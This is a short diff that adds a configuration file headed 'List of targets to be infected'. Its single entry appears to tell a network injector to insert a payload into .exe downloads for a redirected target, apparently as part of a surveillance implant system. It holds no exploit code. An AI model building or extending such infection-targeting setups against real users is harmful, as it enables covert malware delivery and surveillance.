@@ -1,0 +1,7 @@
+################################################################################
+#
+# List of targets to be infected
+# The "tag" must match the one in the redirected_users file
+#
+################################################################################
+mirror18 INJECT-EXE RCS_0000000021 *.exe*
